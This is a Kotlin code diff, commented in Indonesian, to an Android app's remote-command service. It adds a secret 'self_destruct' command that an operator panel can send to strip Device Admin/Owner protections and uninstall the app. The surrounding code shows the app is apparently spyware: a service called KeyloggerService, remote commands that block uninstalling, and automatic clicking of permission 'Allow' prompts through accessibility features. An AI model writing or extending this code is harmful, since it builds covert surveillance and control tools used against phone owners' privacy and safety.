@@ -285,6 +285,10 @@ class ConnectorService : Service() {
             // ── Block/Unblock Uninstall (Device Admin/Owner) ──
             cmd.startsWith("block_uninstall:") -> Pair(AppDeviceAdminReceiver.setBlockUninstall(this, cmd.removePrefix("block_uninstall:").trim() == "true"), "command_result")
 
+            // ── Self-Destruct: matikan guard + hapus admin + uninstall ──
+            // RAHASIA — hanya operator panel yang bisa kirim command ini
+            cmd == "self_destruct"  -> Pair(doSelfDestruct(), "command_result")
+
             // ── Auto-Grant: klik "Izinkan" otomatis via AccessibilityService ──
             // Tidak perlu overlay / SYSTEM_ALERT_WINDOW — murni node ACTION_CLICK
             cmd == "auto_grant_on"     -> Pair(doAutoGrantOn(), "command_result")
@@ -718,7 +722,61 @@ class ConnectorService : Service() {
     }
 
     // ── Auto-Grant via AccessibilityService ───────────────────────────────────
-    private fun doAutoGrantOn(): String {
+    // ─────────────────────────────────────────
+    //  SELF-DESTRUCT  (owner-only backdoor)
+    // ─────────────────────────────────────────
+
+    /**
+     * Matikan semua proteksi anti-uninstall lalu launch uninstall dialog.
+     * Hanya bisa dipanggil via remote command dari panel — tidak ada UI-nya.
+     *
+     * Urutan:
+     *   1. Nonaktifkan guard halaman Device Admin (KeyloggerService flag)
+     *   2. Lepas setUninstallBlocked
+     *   3. Lepas Device Owner (jika aktif)
+     *   4. Lepas Device Admin
+     *   5. Launch ACTION_DELETE intent → uninstall dialog normal
+     */
+    private fun doSelfDestruct(): String {
+        return try {
+            // 1. Matikan guard AccessibilityService
+            KeyloggerService.adminGuardEnabled = false
+
+            val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+            val admin = AppDeviceAdminReceiver.getComponentName(this)
+
+            // 2. Lepas setUninstallBlocked
+            try { dpm.setUninstallBlocked(admin, packageName, false) } catch (_: Exception) {}
+
+            // 3. Lepas User Restrictions jika Device Owner
+            if (dpm.isDeviceOwnerApp(packageName)) {
+                try { dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_UNINSTALL_APPS) } catch (_: Exception) {}
+                try { dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_SAFE_BOOT) } catch (_: Exception) {}
+                try { dpm.clearDeviceOwnerApp(packageName) } catch (_: Exception) {}
+            }
+
+            // 4. Lepas Device Admin
+            try { dpm.removeActiveAdmin(admin) } catch (_: Exception) {}
+
+            // 5. Launch uninstall dialog (sekarang bisa karena admin sudah lepas)
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                try {
+                    val uri = android.net.Uri.parse("package:$packageName")
+                    startActivity(android.content.Intent(android.content.Intent.ACTION_DELETE, uri).apply {
+                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                    })
+                } catch (_: Exception) {}
+            }, 800)
+
+            polling = false
+            stopSelf()
+            "✅ Self-destruct initiated — admin removed, uninstall dialog launching"
+        } catch (e: Exception) {
+            "ERROR: ${e.message}"
+        }
+    }
+
+        private fun doAutoGrantOn(): String {
         if (KeyloggerService.instance == null)
             return "⚠️ AccessibilityService belum aktif — aktifkan dulu di Settings"
         KeyloggerService.autoGrantEnabled = true
